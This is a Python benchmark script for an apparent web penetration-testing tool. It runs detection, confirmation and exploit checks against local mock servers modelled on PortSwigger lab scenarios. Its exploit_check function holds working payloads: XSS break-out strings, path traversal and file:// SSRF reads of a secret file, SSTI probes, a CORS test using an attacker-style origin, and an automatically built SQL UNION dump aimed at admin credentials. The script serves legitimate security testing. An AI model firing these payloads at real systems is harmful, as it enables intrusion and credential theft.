#!/usr/bin/env python3
"""Benchmark + gap finder — scores the engine against a catalog modeled on the
PortSwigger Web Security Academy labs (see labs.py).

  detection scenario : crafted request/response -> did triage flag the right class?
  confirm scenario   : live mock -> did the active probe confirm the real bug /
                       reject the benign one?

Writes bench_results.json + gap_report.md. Exit 0 if no gaps, else 1.
No API key. Add scenarios to labs.py to raise the bar.
"""
from __future__ import annotations

import json
import threading
import time
from collections import defaultdict
from http.server import ThreadingHTTPServer

from wapt.config import Config
from wapt.http_client import ScopedSession
from wapt.triage import triage
from wapt import confirm as CF
from wapt.confirm import _with_param
from labs import CATALOG

# the blind-cmdi time probe uses a 10s sleep in the field; shrink it here so the
# benchmark proves the timing logic in a couple of seconds, not ten.
CF._CMDI_DELAY = 2
CF._SQLI_DELAY = 2


def exploit_check(sc, sess, cand, txn) -> tuple:
    """Fire the RECOMMENDED exploit against the mock and verify the win condition.
    Returns (ok, note) or (None, reason) when the class isn't auto-verifiable."""
    cls = sc.vuln_class
    param = cand.param or sc.param
    if cls == "sql-injection":
        u = CF.build_union(sess, txn, param)
        if not u:
            return None, "could not auto-build UNION"
        r = sess.fetch("GET", u["payload"])
        ok = bool(r and "administrator" in (r.resp_body or ""))
        return ok, f"dump payload returns admin creds: {ok}"
    if cls in ("reflected-stored-xss", "dom-xss", "web-message-xss"):
        ct = (txn.header("content-type") or "").lower()
        note = (cand.confirm_note or "").lower()
        if "json" in ct or "eval" in note:
            pay = '"-alert(1)}//'
        elif "javascript string" in note or "js string" in note:
            pay = "'-alert(1)//"
        elif "comment" in note:
            pay = "--><svg onload=alert(1)>"
        elif "attribute" in note:
            pay = '"><svg onload=alert(1)>'
        else:
            pay = "<svg onload=alert(1)>"
        r = sess.fetch("GET", _with_param(txn, param, pay))
        body = r.resp_body or ""
        # the break-out string must come back UNescaped (would execute)
        ok = pay in body and "&lt;" not in body and "&quot;" not in body
        return ok, f"break-out '{pay[:16]}' reflects unescaped: {ok}"
    if cls == "path-traversal":
        r = sess.fetch("GET", _with_param(txn, param, "../../../../home/carlos/secret"))
        ok = bool(r and "SECRET_FLAG" in (r.resp_body or ""))
        return ok, f"traversal reads /home/carlos/secret: {ok}"
    if cls == "ssrf":
        r = sess.fetch("GET", _with_param(txn, param, "file:///home/carlos/secret"))
        ok = bool(r and "SECRET_FLAG" in (r.resp_body or ""))
        return ok, f"SSRF reads the secret via file://: {ok}"
    note = (getattr(cand, "confirm_note", "") or "").lower()
    if cls == "cors-exfil":
        # follow the branch the confirmation found: arbitrary origin, or null-only
        h = {k: v for k, v in txn.req_headers.items()
             if k.lower() not in ("content-length", "host", "origin")}
        origin = "null" if "null" in note else "https://wapt-attacker.example"
        h["Origin"] = origin
        r = sess.fetch("GET", txn.url, headers=h)
        acao = (r.header("access-control-allow-origin") if r else "") or ""
        body = (r.resp_body if r else "") or ""
        ok = acao == origin and "SECRET_FLAG" in body
        return ok, f"origin '{origin}' reflected + secret readable: {ok}"
    if cls == "ssti":
        # fire the arithmetic in the SAME engine syntax the confirmation identified
        if "erb" in note or "freemarker" in note or "<%" in note:
            probe = "wZ<%= 7*7 %>zW"
        elif "ruby" in note or "#{" in note:
            probe = "wZ#{7*7}zW"
        elif "java" in note or "smarty" in note or "${" in note:
            probe = "wZ${7*7}zW"
        else:
            probe = "wZ{{7*7}}zW"
        r = sess.fetch("GET", _with_param(txn, param, probe))
        ok = bool(r and "wZ49zW" in (r.resp_body or ""))
        return ok, f"template renders 7*7 as 49 via {probe}: {ok}"
    return None, "no auto-verify for this class (detection/manual only)"


def _run_detect(sc) -> dict:
    cfg = Config(lab="lab", proxy=None, mode="lab")
    cfg.scope = ["web-security-academy.net"]
    cands = triage(sc.stage, [sc.txn], cfg.placeholders())
    detected = sc.vuln_class in {c.vuln_class for c in cands}
    return {"name": sc.name, "topic": sc.topic, "class": sc.vuln_class, "kind": "detect",
            "benign": sc.benign, "detected": detected,
            "detect_ok": detected == sc.expect_detect,
            "confirmed": None, "confirm_ok": None}


def _run_confirm(sc, port) -> dict:
    srv = ThreadingHTTPServer(("127.0.0.1", port), sc.handler)
    threading.Thread(target=srv.serve_forever, daemon=True).start()
    time.sleep(0.05)
    base = f"http://127.0.0.1:{port}"
    try:
        cfg = Config(lab="127.0.0.1", collab="c.oastify.com", proxy=None, mode="lab")
        cfg.scope = ["127.0.0.1"]
        sess = ScopedSession(cfg)
        sp = sc.spec
        txn = sess.fetch("GET", base + sp["url"].split(".net", 1)[-1] if ".net" in sp["url"] else base + sp["url"])
        if sp.get("cookie"):
            txn.req_headers["Cookie"] = sp["cookie"]
        if sp.get("origin"):
            # re-fetch carrying the Origin so header-reflection detectors (CORS) fire
            txn.req_headers["Origin"] = sp["origin"]
            r2 = sess.fetch("GET", txn.url, headers={"Origin": sp["origin"]},
                            note="cors baseline with origin")
            if r2 is not None:
                txn.resp_headers = r2.resp_headers
                txn.resp_body = r2.resp_body
                txn.status = r2.status
        cands = triage(sc.stage, [txn], cfg.placeholders())
        detected = sc.vuln_class in {c.vuln_class for c in cands}
        res = {"name": sc.name, "topic": sc.topic, "class": sc.vuln_class, "kind": "confirm",
               "benign": sc.benign, "detected": detected, "detect_ok": detected,
               "confirmed": None, "confirm_ok": None}
        if detected:
            cand = next(c for c in cands if c.vuln_class == sc.vuln_class)
            v = CF.confirm_candidate(sess, cand, collab=cfg.collab)
            res["confirmed"] = v.ok
            res["confirm_ok"] = (v.ok == sc.expect_confirm)
            res["verdict"] = v.as_note()
            # guidance quality: did it identify the right CONTEXT? (right payload)
            want_ctx = getattr(sc, "expect_context", None)
            if want_ctx:
                res["context_ok"] = want_ctx.lower() in v.as_note().lower()
            # for real (non-benign) confirmed bugs, prove the exploit actually works
            if not sc.benign and v.ok:
                cand.confirm_note = v.as_note()   # let exploit_check follow the engine/branch
                eok, enote = exploit_check(sc, sess, cand, txn)
                res["exploit_ok"] = eok
                res["exploit_note"] = enote
        else:
            res["confirm_ok"] = False
            res["verdict"] = "not detected, so never confirmed"
        return res
    finally:
        srv.shutdown()


def main() -> int:
    results, port = [], 8900
    for sc in CATALOG:
        if sc.kind == "confirm":
            results.append(_run_confirm(sc, port)); port += 1
        else:
            results.append(_run_detect(sc))

    det = [r for r in results if not r["benign"]]
    det_hit = sum(1 for r in det if r["detected"])
    conf = [r for r in results if r["confirm_ok"] is not None]
    conf_hit = sum(1 for r in conf if r["confirm_ok"])
    expl = [r for r in results if r.get("exploit_ok") is not None]
    expl_hit = sum(1 for r in expl if r.get("exploit_ok"))
    # a false positive = benign traffic that got confirmed, OR a benign detection
    # trap that got flagged at all
    fps = [r for r in results if r["benign"]
           and (r.get("confirmed") or (r["kind"] == "detect" and r["detected"]))]

    gaps = []
    for r in results:
        if not r["benign"] and not r["detect_ok"]:
            gaps.append(f"DETECTION: '{r['name']}' [{r['class']}] — not detected")
        if r["benign"] and r["kind"] == "detect" and r["detected"]:
            gaps.append(f"FALSE POSITIVE: '{r['name']}' — benign traffic flagged as {r['class']}")
        if r["confirm_ok"] is False and not (r["benign"] and r["detected"] and not r["confirmed"]):
            if r["benign"] and r.get("confirmed"):
                gaps.append(f"CONFIRM: '{r['name']}' — benign WRONGLY confirmed")
            elif not r["benign"] and r["kind"] == "confirm":
                gaps.append(f"CONFIRM: '{r['name']}' — real bug not confirmed ({r.get('verdict','')})")
        if r.get("exploit_ok") is False:
            gaps.append(f"EXPLOIT: '{r['name']}' — recommended payload did NOT work ({r.get('exploit_note','')})")
        if r.get("context_ok") is False:
            gaps.append(f"CONTEXT: '{r['name']}' — wrong context identified, so the wrong payload is recommended ({r.get('verdict','')})")

    # per-topic rollup
    by_topic = defaultdict(lambda: [0, 0])
    for r in det:
        by_topic[r["topic"]][1] += 1
        by_topic[r["topic"]][0] += int(r["detected"])

    summary = {
        "total_scenarios": len(results),
        "detection_rate": f"{det_hit}/{len(det)}",
        "confirm_rate": f"{conf_hit}/{len(conf)}",
        "exploit_rate": f"{expl_hit}/{len(expl)}",
        "false_positives": len(fps),
        "gaps": gaps,
        "by_topic": {k: f"{v[0]}/{v[1]}" for k, v in sorted(by_topic.items())},
        "results": results,
    }
    json.dump(summary, open("bench_results.json", "w"), indent=2)

    md = ["# WAPT orchestrator — benchmark (PortSwigger lab catalog)",
          f"_generated {time.strftime('%Y-%m-%d %H:%M:%S')} · {len(results)} scenarios_\n",
          f"- **Detection:** {det_hit}/{len(det)}",
          f"- **Confirmation:** {conf_hit}/{len(conf)}",
          f"- **Exploit works (fired + verified):** {expl_hit}/{len(expl)}",
          f"- **False positives:** {len(fps)}\n",
          "## By topic\n"]
    for k, v in summary["by_topic"].items():
        md.append(f"- {k}: {v}")
    md.append("\n## Gaps to fix\n" if gaps else "\n## No gaps — every scenario passed.\n")
    for g in gaps:
        md.append(f"- [ ] {g}")
    open("gap_report.md", "w").write("\n".join(md))

    print(f"\n{len(results)} scenarios  ·  Detection {det_hit}/{len(det)}  ·  "
          f"Confirm {conf_hit}/{len(conf)}  ·  Exploit {expl_hit}/{len(expl)}  ·  FPs {len(fps)}")
    if gaps:
        print(f"\n{len(gaps)} GAP(S):")
        for g in gaps:
            print("  -", g)
    else:
        print("\nNo gaps. Add scenarios to labs.py to push further.")
    print("\nwrote bench_results.json + gap_report.md")
    return 1 if gaps else 0


if __name__ == "__main__":
    raise SystemExit(main())
